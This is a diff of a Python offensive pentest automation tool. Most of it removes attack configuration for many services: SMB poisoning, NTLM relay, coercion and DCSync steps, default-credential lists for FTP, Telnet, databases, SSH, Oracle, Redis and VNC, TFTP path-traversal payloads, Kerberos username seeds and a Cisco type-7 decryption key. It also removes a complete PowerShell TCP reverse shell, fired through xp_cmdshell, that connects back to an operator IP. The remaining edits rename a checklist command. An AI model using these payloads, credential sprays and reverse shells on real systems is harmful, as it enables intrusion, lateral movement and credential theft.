-    r"ppk|pem|key|ovpn|rdp|txt|log|csv|ldb|pfx|p12|reg)$|id_[rd]sa|\.git-credentials|"
-    r"\.npmrc|passwo?rd|secret|cred|backup|\.kdbx)")
-
-
-# ── SMB step 4: SYSVOL / NETLOGON GPP loot (authenticated, DC-targeted) ────────
-_SMBGPP_DEADLINE = 300           # s — hard wall-clock cap
-# SYSVOL/NETLOGON files worth reading — all GPP XML types, autologin, logon scripts, unattend
-_SMB_GPP_RE = re.compile(
-    r"(?i)(?:groups|services|scheduledtasks|datasources|printers|drives|registry)\.xml$|"
-    r"unattend\.xml$|sysprep\.(?:inf|xml)$|\.(?:bat|cmd|ps1|psm1|vbs|kix)$")
-
-
-# ── SMB step 5: LLMNR / NBT-NS / mDNS poisoning + NetNTLM capture ──────────────
-_SMBPOISON_DEADLINE = 600        # s — how long Responder poisons before self-stopping
-_RESPONDER_LOGS = "/usr/share/responder/logs"
-
-
-# ── SMB step 6: NTLM relay to signing-off hosts → dump SAM ─────────────────────
-_SMBRELAY_DEADLINE = 600         # s — how long ntlmrelayx listens before self-stopping
-
-
-# ── SMB step 7: authentication coercion → drive the relay ──────────────────────
-_SMBCOERCE_DEADLINE = 180        # s — overall cap across auth attempts
-_COERCE_METHODS = ("Petitpotam", "DFSCoerce", "ShadowCoerce", "Printerbug", "MSEven")
-
-
-# ── SMB step 8: DC-critical CVEs (DETECTION ONLY) ─────────────────────────────
-_SMBDCCVE_DEADLINE = 240         # s — overall cap
-
-
-# ── SMB step 9: credential spray across hosts (password reuse / lateral) ───────
-_SMBSPRAY_DEADLINE = 300         # s — overall cap
-_SMBSPRAY_MAX_CREDS = 60         # ceiling on distinct creds sprayed
-
-
-# ── SMB step 10: valid creds / hash → command execution (confirm the channel) ──
-_SMBEXEC_DEADLINE = 240          # s — overall cap
-
-
-# ── SMB step 11: dump SAM / LSA / LSASS / DPAPI + DCSync (NTDS) ────────────────
-_SMBDUMP_DEADLINE = 360          # s — overall cap (NTDS can be slow)
-_SMBDUMP_MAX_STORE = 100         # ceiling on NT hashes written back to smb-creds
-
-
-# ── SMB step 12: writable share → planted LNK for hash capture (WRITES + reversible) ──
-_SMBWRITABLE_DEADLINE = 180      # s — overall cap
-_SMBWRITABLE_NAME = "~pshunter"  # recognizable, reversible marker for the planted LNK
-
-
 # ── SMB step 13: foothold — spawn an interactive admin session ─────────────────
 def _open_command_terminal(cmd: str) -> "str | None":
     """Open a new terminal with `cmd` pre-typed on the prompt (editable, NOT executed): the
@@ -5987,75 +5321,12 @@ def _open_command_terminal(cmd: str) -> "str | None":
         return None
 
 
-# ── SMB step 14: manual steps (read-only reference, this host's findings substituted) ──
-# ── WinRM step 1: confirm the WS-Management transport (unauth, stdlib probe) ────
-_WINRM_PORTS = ((5985, False), (5986, True))     # (port, tls) — HTTP and HTTPS WS-Man
-
-
-# ── WinRM step 2: validate harvested creds/hashes against WinRM (reuse/lateral) ──
-_WINRMSPRAY_DEADLINE = 240       # s — overall cap
-
-
 # ── WinRM step 3: interactive shell (evil-winrm) over a WinRM-capable cred ──────
 # ── WinRM step 4: who can log in — Remote Management Users / Administrators ─────
 # ── WinRM step 5: post-access recon over the shell (privesc + pivot surface) ────
 _HOT_PRIVS = {"SeImpersonatePrivilege", "SeAssignPrimaryTokenPrivilege", "SeDebugPrivilege",
               "SeBackupPrivilege", "SeRestorePrivilege", "SeTakeOwnershipPrivilege",
               "SeLoadDriverPrivilege", "SeManageVolumePrivilege", "SeTcbPrivilege"}
-
-
-# ── WinRM step 6: manual steps (read-only reference, this host's findings substituted) ──
-# ── FTP step 1: banner + version → searchsploit (stdlib ftplib) ────────────────
-_FTP_KNOWN_VULN = [   # (banner regex, CVE, description) — famous FTP RCE/backdoor versions
-    (r"vsftpd\s*2\.3\.4",       "CVE-2011-2523", "vsftpd 2.3.4 backdoor (user ':)') → root shell on 6200"),
-    (r"ProFTPD\s*1\.3\.5",      "CVE-2015-3306", "ProFTPD 1.3.5 mod_copy (SITE CPFR/CPTO) → RCE"),
-    (r"ProFTPD\s*1\.3\.3c",     "CVE-2010-4221", "ProFTPD 1.3.3c backdoor / telnet IAC → RCE"),
-    (r"ProFTPD\s*1\.3\.[0-2]\b", "CVE-2010-4221", "ProFTPD ≤1.3.2 telnet IAC overflow"),
-]
-
-
-# ── FTP step 2: anonymous login → browse the tree (stdlib ftplib) ──────────────
-_FTPANON_DEADLINE = 60           # s — wall-clock cap on the walk
-_FTPANON_MAXDEPTH = 4
-_FTPANON_MAXFILES = 300
-# interesting files on an FTP tree: the SMB loot set plus web source / config / DB files
-_FTP_LOOT_RE = re.compile(r"(?i)config|\.(?:php|aspx?|jsp|cgi|pl|py|sh|htaccess|db|sqlite3?)$")
-
-
-# ── FTP step 3: test write access (throwaway upload → verify → delete) ─────────
-_FTPWRITE_DEADLINE = 60          # s — wall-clock cap
-_FTPWRITE_MAXDIRS = 40           # directories to probe for write access
-
-
-# ── FTP step 4: known / default / reused credentials (targeted, no wordlist) ───
-_FTPCREDS_DEADLINE = 120         # s — wall-clock cap
-_FTPCREDS_MAX = 60               # ceiling on login attempts (targeted, not a brute)
-_FTP_DEFAULTS = [                # curated FTP defaults — not a wordlist (lockout-safe)
-    ("ftp", "ftp"), ("ftp", ""), ("ftp", "password"), ("admin", "admin"), ("admin", ""),
-    ("admin", "password"), ("administrator", "administrator"), ("root", "root"), ("root", "toor"),
-    ("root", ""), ("ftpuser", "ftpuser"), ("user", "user"), ("guest", "guest"), ("test", "test"),
-    ("webadmin", "webadmin"), ("www", "www"),
-]
-
-
-# ── FTP step 5: FTP-writable dir served by a web root → webshell (RCE) ──────────
-_FTPWEB_DEADLINE = 120
-_FTP_HTTP_PORTS = {80, 443, 8080, 8000, 8443, 8888, 5000, 3000}
-_FTP_SHELLS = {   # inert exec-verify payloads (computed math marker — NOT a live command shell)
-    "php": (".php", lambda mk, a, b: f"<?php echo '{mk}'.({a}*{b}).'{mk}'; ?>"),
-    "asp": (".asp", lambda mk, a, b: f'<% Response.Write("{mk}" & ({a}*{b}) & "{mk}") %>'),
-    "jsp": (".jsp", lambda mk, a, b: f'<%= "{mk}"+({a}*{b})+"{mk}" %>'),
-}
-
-
-# ── FTP step 6: FTP-bounce (PORT) → scan the server's internal ports ───────────
-_FTPBOUNCE_DEADLINE = 120
-_BOUNCE_PORTS = {   # internal-only services worth finding via bounce (port → hint)
-    22: "SSH", 23: "Telnet", 25: "SMTP", 445: "SMB", 1433: "MSSQL", 3306: "MySQL",
-    3389: "RDP", 5432: "PostgreSQL", 5985: "WinRM", 6379: "Redis", 8000: "http-alt",
-    8080: "http-alt", 8443: "https-alt", 9200: "Elasticsearch", 11211: "Memcached",
-    15672: "RabbitMQ", 27017: "MongoDB",
-}
 
 
 # ── FTP step 7: foothold — pick a viable path to a shell ───────────────────────
@@ -6066,357 +5337,6 @@ _BOUNCE_PORTS = {   # internal-only services worth finding via bounce (port → 
 _TFTP_RRQ, _TFTP_WRQ, _TFTP_DATA, _TFTP_ACK, _TFTP_ERROR = 1, 2, 3, 4, 5
 
 
-# ── TFTP step 1: confirm UDP/69 (no auth) + path-traversal arbitrary read ───────
-# Traversal payloads for the classic TFTP daemon read bugs (SolarWinds, tftpd32, HP, …).
-# We only ASSERT a vuln when the retrieved bytes actually match the target file's signature —
-# no CVE token is emitted (the exact CVE is daemon-specific; see tftp-next / searchsploit).
-_TFTP_TRAVERSAL = [
-    ("etc/passwd",          re.compile(rb"^\w+:.*:0:0:", re.M),                    "unix", "/etc/passwd"),
-    ("windows/win.ini",     re.compile(rb"(?i)\[fonts\]|\[extensions\]"),          "win",  "win.ini"),
-    ("boot.ini",            re.compile(rb"(?i)\[boot loader\]"),                   "win",  "boot.ini"),
-    ("windows/system32/drivers/etc/hosts", re.compile(rb"(?i)localhost"),         "win",  "hosts"),
-]
-_TFTP_TRAVERSAL_DEPTHS = (5, 7, 9, 12)
-
-
-# ── TFTP step 2: grab well-known files (no listing → guess names) → grep for creds ─
-# TFTP can't list a directory, so enumeration IS filename guessing. This set targets what
-# actually lands on a TFTP server in the wild: network-device configs (the richest — they
-# leak enable/user creds & SNMP), boot/PXE files, and stray backups/web configs.
-_TFTP_WORDLIST = [
-    # network device configs — the jackpot (Cisco/Juniper/HP/etc.)
-    "running-config", "startup-config", "running.cfg", "startup.cfg", "config.text",
-    "config.cfg", "config.txt", "config.xml", "nvram", "router-config", "router.cfg",
-    "switch-config", "switch.cfg", "backup-config", "backup.cfg", "cisco.cfg", "confg",
-    # VoIP phone provisioning
-    "SEPDefault.cnf", "SIPDefault.cnf", "XMLDefault.cnf.xml", "0000000000000.cnf.xml",
-    "gk.cfg", "g3.cfg",
-    # PXE / boot
-    "pxelinux.cfg/default", "pxelinux.0", "boot.ini", "grub.cfg",
-    # backups / archives operators drop here
-    "backup.tar", "backup.zip", "backup.tgz", "config.bak", "flash.bin",
-    # windows / app configs & the odd secret file
-    "web.config", "unattend.xml", "sysprep.xml", ".env", "passwd", "shadow", "id_rsa",
-]
-_TFTPGRAB_DEADLINE = 90          # s — wall-clock cap on the whole sweep
-_TFTPGRAB_MAXBYTES = 262144      # per file (256 KiB) — configs are small; don't slurp firmware
-
-# Cisco type-7 is trivially reversible (fixed-key Vigenère) → decrypt to a usable cred.
-_C7_KEY = "dsfd;kfoA,.iyewrkldJKDHSUBsgvca69834ncxv9873254k;fg87"
-
-
-# ── TFTP step 3: test write access (WRQ) — non-reversible, TFTP has no DELETE ────
-# ── TFTP step 4: manual steps & further research (reference only, context-aware) ─
-# ══ Telnet (23) ══ cleartext remote login — a fast HTB foothold via no-auth shells, weak/default
-# creds or device backdoors. Raw socket (telnetlib was removed in 3.13): we answer IAC option
-# negotiation (refuse everything) so the server sends its banner/prompt, then fingerprint it and,
-# when no login is demanded, probe for an unauthenticated shell with a computed marker.
-_TELNET_PROMPT_LOGIN = re.compile(r"(?i)(?:login|user\s?name|username)\s*:\s*$")
-_TELNET_PROMPT_PASS = re.compile(r"(?i)password\s*:\s*$")
-
-
-# ── Telnet step 2: known / default / reused credentials (targeted, lockout-safe) ──
-_TELNETCREDS_DEADLINE = 120       # s — wall-clock cap
-_TELNETCREDS_MAX = 60             # ceiling on login attempts (targeted, not a brute)
-_TELNET_DEFAULTS = [              # curated telnet / device defaults — not a wordlist
-    ("root", ""), ("root", "root"), ("root", "toor"), ("root", "admin"), ("root", "password"),
-    ("root", "calvin"), ("root", "default"), ("root", "1234"), ("admin", "admin"), ("admin", ""),
-    ("admin", "password"), ("admin", "1234"), ("admin", "admin123"), ("administrator", "administrator"),
-    ("user", "user"), ("guest", "guest"), ("guest", ""), ("cisco", "cisco"), ("support", "support"),
-    ("ubnt", "ubnt"), ("pi", "raspberry"),
-]
-
-
-# ── Telnet foothold: auto-login interactive session (spawned via spawn-shell) ──
-_TELNET_SHELL_SRC = r'''
-import socket, sys, os, select, time
-IP = __IP__
-PORT = __PORT__
-USER = __USER__
-PW = __PW__
-s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-s.connect((IP, PORT))
-st = [0]; opt = [None]
-def feed(data):
-    out = bytearray(); rep = bytearray()
-    for b in data:
-        if st[0] == 0:
-            if b == 255: st[0] = 1
-            else: out.append(b)
-        elif st[0] == 1:
-            if b in (251, 252, 253, 254): opt[0] = b; st[0] = 2
-            elif b == 250: st[0] = 3
-            elif b == 255: out.append(255); st[0] = 0
-            else: st[0] = 0
-        elif st[0] == 2:
-            if opt[0] == 253: rep += bytes((255, 252, b))
-            elif opt[0] == 251: rep += bytes((255, 254, b))
-            st[0] = 0
-        elif st[0] == 3:
-            st[0] = 4 if b == 255 else 3
-        elif st[0] == 4:
-            st[0] = 0 if b == 240 else 3
-    if rep:
-        try: s.sendall(bytes(rep))
-        except OSError: pass
-    return bytes(out)
-if USER:
-    buf = b""; su = sp = False; end = time.time() + 15
-    while time.time() < end and not sp:
-        r, _, _ = select.select([s], [], [], 0.5)
-        if s in r:
-            try: d = s.recv(4096)
-            except OSError: break
-            if not d: break
-            c = feed(d); buf += c
-            os.write(1, c)
-            low = buf.lower()
-            if not su and (b"login:" in low or b"username:" in low):
-                s.sendall((USER + "\r\n").encode()); su = True; buf = b""
-            elif su and not sp and b"password" in low:
-                s.sendall((PW + "\r\n").encode()); sp = True; buf = b""
-try:
-    import termios, tty
-    old = termios.tcgetattr(0); tty.setraw(0)
-except Exception:
-    old = None
-try:
-    while True:
-        r, _, _ = select.select([0, s], [], [])
-        if 0 in r:
-            d = os.read(0, 1024)
-            if not d: break
-            s.sendall(d)
-        if s in r:
-            d = s.recv(4096)
-            if not d: break
-            os.write(1, feed(d))
-finally:
-    if old is not None:
-        try: termios.tcsetattr(0, termios.TCSADRAIN, old)
-        except Exception: pass
-    s.close()
-sys.stdout.write("\n[*] telnet session closed - press enter to close this tab\n")
-try: input()
-except Exception: pass
-'''
-
-
-# ── Telnet step 3: sniff cleartext creds off the wire (passive; MITM stays manual) ──
-_TELNETSNIFF_DEADLINE = 300       # s — capture window before it self-stops
-_TELNETSNIFF_MAXBUF = 65536       # cap per-direction reassembly
-
-
-# ── Telnet step 4: manual steps & further research (reference only, context-aware) ─
-# ══ MySQL / MariaDB (3306) ══ the initial handshake leaks the server version in cleartext (no
-# auth), so the banner is pure stdlib; auth/queries later go through netexec (binary protocol).
-# ── MySQL step 2: root no-pass + default / reused creds; CVE-2012-2122 bypass on old 5.x ──
-_MYSQLCREDS_DEADLINE = 120
-_MYSQLCREDS_MAX = 60
-_MYSQL_BYPASS_TRIES = 256        # CVE-2012-2122: ~1/256 wrong-password auths slip through
-_MYSQL_DEFAULTS = [
-    ("root", ""), ("root", "root"), ("root", "toor"), ("root", "mysql"), ("root", "password"),
-    ("root", "admin"), ("root", "123456"), ("root", "P@ssw0rd"), ("admin", "admin"),
-    ("mysql", "mysql"), ("user", "user"), ("test", "test"), ("dbuser", "dbuser"), ("web", "web"),
-]
-
-
-# ── MySQL step 3: loot — enumerate DBs/users, dump hashes & app creds, LOAD_FILE ──
-_MYSQLLOOT_DEADLINE = 120
-_MYSQL_SYSDB = ("information_schema", "performance_schema", "sys", "mysql")
-
-
-# ── MySQL step 4: RCE — INTO OUTFILE webshell (FILE priv), UDF guidance ────────
-_MYSQLRCE_DEADLINE = 90
-_MYSQL_HTTP_PORTS = {80, 443, 8080, 8000, 8443, 8888, 5000, 3000}
-_MYSQL_WEBROOTS = ["/var/www/html", "/var/www", "/usr/share/nginx/html", "/srv/http",
-                   "/var/www/htdocs", "/app/public", "/var/www/html/uploads"]
-
-
-# ── MySQL step 5: manual steps & further research (reference only, context-aware) ─
-# ══ PostgreSQL (5432) ══ no unauthenticated banner: the server only declares its server_version
-# after a successful login. What IS reachable pre-auth is the wire handshake — an SSLRequest tells
-# us whether TLS is offered, and a StartupMessage makes the server declare its required auth method
-# (trust / cleartext / md5 / SCRAM) or return a structured pg_hba error. All pure stdlib; creds /
-# loot / RCE go through the psql CLI (netexec has no postgres protocol).
-_PG_PROTO_V3 = 196608            # protocol 3.0
-_PG_SSL_MAGIC = 80877103         # SSLRequest sentinel
-_PG_AUTH = {0: "trust (no password)", 2: "KerberosV5", 3: "cleartext password",
-            5: "MD5 password", 6: "SCM credential", 7: "GSSAPI", 9: "SSPI",
-            10: "SASL / SCRAM-SHA-256"}
-
-
-# ── PostgreSQL step 2: postgres blank/default + reused creds; flag superuser ──────
-_PGCREDS_DEADLINE = 120
-_PGCREDS_MAX = 60
-_PG_DEFAULTS = [
-    ("postgres", "postgres"), ("postgres", ""), ("postgres", "password"),
-    ("postgres", "admin"), ("postgres", "root"), ("postgres", "postgres123"),
-    ("postgres", "P@ssw0rd"), ("postgres", "changeme"), ("postgres", "123456"),
-    ("admin", "admin"), ("pgsql", "pgsql"), ("test", "test"),
-]
-
-
-# ── PostgreSQL step 3: loot — DBs/roles, pg_shadow hashes, app creds, pg_read_file ──
-_PGLOOT_DEADLINE = 120
-_PG_SYSDB = ("template0", "template1")
-
-
-# ── PostgreSQL step 4: RCE — COPY … FROM PROGRAM command execution (superuser, 9.3+) ──
-_PGRCE_DEADLINE = 60
-
-
-# ── PostgreSQL step 5: manual steps & further research (reference only, context-aware) ─
-# ══ MS SQL Server (1433 / 1434) ══ the version is discoverable unauthenticated: the SQL Browser
-# (UDP 1434, SSRP) advertises instances + version, and the TDS pre-login on 1433 returns version
-# bytes. Both are pure stdlib; auth / xp_cmdshell / queries later go through netexec (TDS binary).
-_MSSQL_RELEASE = {16: "2022", 15: "2019", 14: "2017", 13: "2016", 12: "2014",
-                  11: "2012", 10: "2008", 9: "2005", 8: "2000"}
-
-
-# ── MSSQL step 2: sa blank/default + reused creds (netexec mssql, SQL auth) ─────
-_MSSQLCREDS_DEADLINE = 120
-_MSSQLCREDS_MAX = 50
-_MSSQL_DEFAULTS = [
-    ("sa", ""), ("sa", "sa"), ("sa", "password"), ("sa", "Password1"), ("sa", "P@ssw0rd"),
-    ("sa", "sql"), ("sa", "sa123"), ("sa", "admin"), ("sa", "sqlserver"), ("sa", "changeme"),
-    ("admin", "admin"), ("sql", "sql"), ("mssql", "mssql"), ("sqladmin", "sqladmin"),
-]
-
-
-# ── MSSQL step 3: xp_cmdshell OS command execution (sysadmin) → foothold ────────
-# PowerShell TCP reverse shell (base64 for `powershell -e`), fired through xp_cmdshell.
-_MSSQL_PS_REVSHELL = (
-    "$c=New-Object System.Net.Sockets.TCPClient('{ip}',{port});$s=$c.GetStream();"
-    "[byte[]]$b=0..65535|%{{0}};while(($i=$s.Read($b,0,$b.Length)) -ne 0){{"
-    "$d=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0,$i);"
-    "$r=(iex $d 2>&1|Out-String);$r2=$r+'PS '+(pwd).Path+'> ';"
-    "$sb=([text.encoding]::ASCII).GetBytes($r2);$s.Write($sb,0,$sb.Length);$s.Flush()}};$c.Close()")
-
-
-# ── MSSQL step 4: loot — databases, linked servers, sql_login hashes, OPENROWSET ──
-_MSSQL_SYSDB = ("master", "tempdb", "model", "msdb")
-
-
-# ── MSSQL step 5: manual steps & further research (reference only, context-aware) ─
-# ══ SSH (22 / 2222) ══ the version banner and the KEXINIT algorithm lists are exchanged in the
-# clear before auth, so the fingerprint is pure stdlib; auth / shell come later (ssh CLI / netexec).
-# ── SSH step 2: reused / known creds (targeted, lockout/fail2ban-aware) → shell ─
-_SSHCREDS_DEADLINE = 120
-_SSHCREDS_MAX = 40
-_SSH_DEFAULTS = [
-    ("root", "root"), ("root", "toor"), ("root", "password"), ("root", "admin"), ("root", "raspberry"),
-    ("admin", "admin"), ("user", "user"), ("ubuntu", "ubuntu"), ("pi", "raspberry"), ("git", "git"),
-    ("test", "test"), ("oracle", "oracle"), ("vagrant", "vagrant"), ("msfadmin", "msfadmin"),
-    ("guest", "guest"),
-]
-
-
-# ── SSH step 3: manual steps & further research (reference only, context-aware) ──
-# ══ LDAP / Active Directory (389 / 636 / 3268 / 3269) ══ AD enumeration over LDAP. netexec is the
-# engine (binary LDAP/BER); creds reused from the SMB phase unlock the rich enumeration.
-_LDAPENUM_DEADLINE = 180
-
-
-# ── LDAP step 2: AS-REP roast (no creds) + Kerberoast (any domain cred) → hashes ─
-# ── LDAP step 3: loot — LAPS, gMSA, user-description secrets, BloodHound collect ─
-# ── LDAP step 4: manual steps & further research (reference only, context-aware) ─
-# ══ Oracle Database (1521 …) ══ the TNS listener speaks a binary protocol and there is no sqlplus /
-# odat client guaranteed on the box, so the automated phase is stdlib TNS probing + nmap's Oracle NSE
-# (version, SID brute, default-account brute). Authenticated file-read / RCE go through odat + a valid
-# SID + creds and stay in the reference step (oracle-next). netexec has no oracle protocol.
-_TNS_CMD_TIMEOUT = 6.0
-_ORACLE_SID_DEADLINE = 180
-_ORACLE_CREDS_DEADLINE = 180
-# classic default account:password pairs — one password per account (no lockout, like smb-spray)
-_ORACLE_DEFAULTS = [
-    ("system", "manager"), ("sys", "change_on_install"), ("scott", "tiger"),
-    ("dbsnmp", "dbsnmp"), ("system", "oracle"), ("sys", "oracle"), ("oracle", "oracle"),
-    ("system", "admin"), ("hr", "hr"), ("outln", "outln"), ("mdsys", "mdsys"),
-    ("ctxsys", "ctxsys"), ("xdb", "xdb"), ("wksys", "wksys"), ("system", "manager1"),
-    ("sys", "sys"), ("apps", "apps"), ("system", "password"),
-]
-_ORACLE_DBA = {"sys", "system", "sysman", "dbsnmp"}
-
-
-# ── Oracle step 4: manual steps & further research (reference only, context-aware) ─
-# ══ Kerberos (88 / 464) ══ the AD authentication service. Its distinct value is what works over
-# port 88 WITHOUT credentials or an LDAP bind: AS-REQ user enumeration and AS-REP roasting, plus a
-# quiet pre-auth password spray. impacket (GetNPUsers / GetUserSPNs / getTGT) + nmap krb5-enum-users
-# are the engines. Validated logins are stored as domain creds so LDAP/SMB reuse them; delegation &
-# ticket attacks stay in the reference step. Complements the LDAP/AD phase (ldap-roast) over 389.
-_KRB_ENUM_DEADLINE = 180
-_KRB_SPRAY_DEADLINE = 180
-_KRB_USER_SEED = [
-    "administrator", "guest", "krbtgt", "admin", "administrador", "user", "test", "info",
-    "service", "svc", "svc_sql", "svc-sql", "sqlsvc", "sql", "mssql", "svc_backup", "backup",
-    "svc_web", "web", "www", "http", "ftp", "ldap", "exchange", "smtp", "mail", "helpdesk",
-    "operator", "support", "manager", "dev", "developer", "jenkins", "git", "oracle",
-    "postgres", "tomcat", "sysadmin", "netadmin", "dbadmin", "printsvc", "scanner", "vpn",
-    "remote", "default", "audit", "security", "vagrant", "ansible", "sccm", "veeam",
-    "j.smith", "jsmith", "asmith", "adminuser", "serviceaccount", "testuser", "sharepoint",
-]
-
-
-# ── Kerberos step 4: manual steps & further research (reference only, context-aware) ─
-# ══ Redis (6379 / 6380) ══ RESP is a trivial text protocol, so this is pure stdlib. An unauthenticated
-# (or weakly-authenticated) Redis is a fast path to RCE — CONFIG SET dir/dbfilename + SAVE writes an
-# attacker-controlled file anywhere the redis user can write (webshell / SSH key / cron). Read/loot and
-# the webshell RCE are automated + exec-verified; SSH-key / module / replication stay in the reference.
-_REDIS_INFO_DEADLINE = 40
-_REDIS_LOOT_DEADLINE = 60
-_REDIS_DEFAULTS = ["foobared", "redis", "password", "admin", "root", "P@ssw0rd", "123456", "redis123"]
-_REDIS_WEBROOTS = ["/var/www/html", "/var/www", "/usr/share/nginx/html", "/srv/http",
-                   "/var/www/htdocs", "/app/public"]
-
-
-# ── Redis step 5: manual steps & further research (reference only, context-aware) ─
-# ══ MongoDB (27017 / 27018) ══ there's no mongo/mongosh client on the box, but the wire protocol is
-# BSON over OP_QUERY (legacy) / OP_MSG (3.6+), so a minimal stdlib client covers the high-value path:
-# an unauthenticated MongoDB → list every database/collection and dump documents (creds/tokens). SCRAM
-# auth isn't done in stdlib, so authenticated dumps + default-cred brute go through nmap / mongosh.
-_MONGO_OP_REPLY = 1
-_MONGO_OP_QUERY = 2004
-_MONGO_OP_MSG = 2013
-_MONGO_LOOT_DEADLINE = 90
-_MONGO_JUICY = re.compile(r"pass|pwd|secret|token|cred|hash|key|auth|user|email|login|flag", re.I)
-
-
-# ── MongoDB step 4: manual steps & further research (reference only, context-aware) ─
-# ══ RDP (3389) ══ the security layer + NLA state is discoverable unauthenticated via the X.224 RDP
-# negotiation (pure stdlib); netexec rdp adds the NTLM machine/domain/OS build, and validated creds
-# open an interactive rdesktop session. BlueKeep / MS12-020 are version/nmap gated.
-_RDP_PROTO_NAMES = {0: "Standard RDP Security", 1: "TLS", 2: "CredSSP (NLA)", 8: "CredSSP-EX", 4: "RDSTLS"}
-_RDP_NEG_FAIL = {1: "SSL_REQUIRED_BY_SERVER", 2: "SSL_NOT_ALLOWED_BY_SERVER",
-                 3: "SSL_CERT_NOT_ON_SERVER", 4: "INCONSISTENT_FLAGS",
-                 5: "HYBRID_REQUIRED_BY_SERVER", 6: "SSL_WITH_USER_AUTH_REQUIRED_BY_SERVER"}
-_RDPCREDS_DEADLINE = 150
-
-
-# ══ VNC (5900-5903) ══ the RFB handshake advertises the security types unauthenticated (pure stdlib),
-# so a "None" type = a wide-open desktop; VNC Auth = a single (8-char, DES) password to spray. netexec
-# vnc validates passwords; vncviewer opens the desktop. RealVNC auth-bypass (CVE-2006-2369) is nmap-gated.
-_VNC_SECTYPES = {0: "Invalid", 1: "None (NO AUTH)", 2: "VNC Auth", 5: "RA2", 6: "RA2ne",
-                 16: "Tight", 18: "TLS", 19: "VeNCrypt", 30: "Apple ARD", 35: "UltraVNC MS-Logon II"}
-_VNC_DEFAULTS = ["password", "vnc", "123456", "admin", "root", "secret", "12345678",
-                 "letmein", "test", "vncpass", "changeme", "raspberry"]
-
-
-# ══ Privilege Escalation phase 1: spawn a shell ══ one place to land a foothold, whatever the
-# service surfaced. A router: it detects which of this host's services have a viable path to a
-# shell (from findings already in the DB) and dispatches to that service's existing foothold tool
-# (each keeps its own method sub-picker). No re-implementation — pure aggregation.
-# tool key -> (short label shown in the checklist, runner(ip, port, proto) -> output str)
-# What runs behind each wired step, shown compactly under the checklist line. Verified against
-# every _tool_* source. External Kali binaries invoked: whatweb / openssl / searchsploit (each
-# IS the step), sqlmap (driven by sqli-scan, only if installed), and — for the SMB phase, where
-# a pure-Python client is impractical — netexec (with smbclient/rpcclient/nmap fallback). Every
-# HTTP engine is pure stdlib — no john/hashcat/hydra/ffuf/gobuster/wpscan/etc. on that side
-# (arjun is reused only as a wordlist file, not run). Per key: (engine label, time-cap text | None).
-# tools that harvest hostnames → maintain the managed /etc/hosts block (root) / show the
-# paste line (no root); used to print the right sudo notice at launch
-_HOSTS_WRITING_TOOLS = {"http-headers", "ssl-cert", "http-source", "vhost-fuzz", "smb-enum"}
-
 # status glyph + colour for a checklist step
 _STEP_MARK = {"done": ("✓", GREEN), "skip": ("⊘", MAGENTA), "running": ("⏳", YELLOW),
               None: ("○", DIM)}
@@ -6424,8 +5344,8 @@ _STEP_MARK = {"done": ("✓", GREEN), "skip": ("⊘", MAGENTA), "running": ("⏳
 
 def _render_exploit_checklist(ip: str, target: tuple) -> None:
     """One service's pentest checklist: each step with its status (○ to-do / ✓ done /
-    ⊘ skip) and, beneath a step, the copy-paste commands it offers (lettered a–z, opened
-    with `r <n><letter>`)."""
+    ⊘ skip) and, beneath a step, the copy-paste commands it offers (lettered a–z, copied
+    into a new terminal with `c <n><letter>`)."""
     port, proto, label, key, ver, signal = target
     _sync_hosts_block(ip)     # entering a host's checklist as root materialises its DB domains → hosts
     steps = _EXPLOIT_STEPS.get(key) or _EXPLOIT_STEPS["other"]
@@ -6445,11 +5365,11 @@ def _render_exploit_checklist(ip: str, target: tuple) -> None:
         print(f"  {CYAN}{i:>2}{RESET} {col}{sym}{RESET} {body}")
         for j, c in enumerate(cmds or []):
             letter = chr(ord("a") + j)
-            print(f"        {DIM}{letter}{RESET}  {c}  {DIM}·  r {i}{letter}{RESET}")
+            print(f"        {DIM}{letter}{RESET}  {c}  {DIM}·  c {i}{letter}{RESET}")
 
 
 def _run_step_command(target: tuple, n: int, letter: str) -> None:
-    """Command-mode `r <n><letter>`: open the chosen command in a new terminal, pre-typed
+    """Command-mode `c <n><letter>`: copy the chosen command into a new terminal, pre-typed
     on the prompt (editable, NOT executed) so the operator fills the <PLACEHOLDERS> and runs
     it. Headless → print the command to copy by hand. Step status is left to the operator
     (mark it done with <n> when finished)."""
@@ -6473,22 +5393,22 @@ def _run_step_command(target: tuple, n: int, letter: str) -> None:
         if row_id is not None:
             sys.stdout.write(f"\033]777;psspawncmd;{int(row_id)}\007")   # id-only channel
             sys.stdout.flush()
-            print(f"\n{GREEN}▶ opened in a new terminal tab{RESET} {DIM}— edit the "
+            print(f"\n{GREEN}▶ copied into a new terminal tab{RESET} {DIM}— edit the "
                   f"<PLACEHOLDERS> and press Enter to run:{RESET}\n  {BOLD}{cmd}{RESET}")
             return
         # DB unavailable → fall through to the external-terminal / headless path
     used = _open_command_terminal(cmd)
     if used:
-        print(f"\n{GREEN}▶ opened in {used}{RESET} {DIM}— edit the <PLACEHOLDERS> and press "
+        print(f"\n{GREEN}▶ copied into {used}{RESET} {DIM}— edit the <PLACEHOLDERS> and press "
               f"Enter to run:{RESET}\n  {BOLD}{cmd}{RESET}")
     else:
         print(f"\n{DIM}headless — copy & run this yourself:{RESET}\n  {BOLD}{cmd}{RESET}")
 
 
 def _exploit_service_view(ip: str, target: tuple) -> None:
-    """One service's checklist: <n> toggles done, s <n> toggles skip, `r <n><letter>` opens
-    that step's copy-paste command in a new terminal (pre-typed, edit the <PLACEHOLDERS>,
-    Enter to run). Status is saved so progress survives sessions."""
+    """One service's checklist: <n> toggles done, s <n> toggles skip, `c <n><letter>` copies
+    that step's command into a new terminal (pre-typed, edit the <PLACEHOLDERS>, Enter to
+    run). Status is saved so progress survives sessions."""
     port, proto, _label, key = target[0], target[1], target[2], target[3]
     steps = _EXPLOIT_STEPS.get(key) or _EXPLOIT_STEPS["other"]
 
@@ -6511,19 +5431,19 @@ def _exploit_service_view(ip: str, target: tuple) -> None:
         if v.startswith("s") and v[1:].strip().isdigit():
             _toggle(int(v[1:].strip()), "skip")
             return "refresh"
-        m = re.match(r"r\s*(\d+)([a-z]?)$", v)   # r <n>  or  r <n><letter>
+        m = re.match(r"c\s*(\d+)([a-z]?)$", v)   # c <n>  or  c <n><letter>
         if m:
             _run_step_command(target, int(m.group(1)), m.group(2))
-            return "stay"                        # just the launch line + bare prompt (no redraw)
+            return "stay"                        # just the copy line + bare prompt (no redraw)
         if v.isdigit():
             _toggle(int(v), "done")
             return "refresh"
         print(f"{RED}✗ unknown option{RESET} "
-              f"{DIM}— <n> done · s <n> skip · r <n><a-z> open cmd · s · f · b{RESET}")
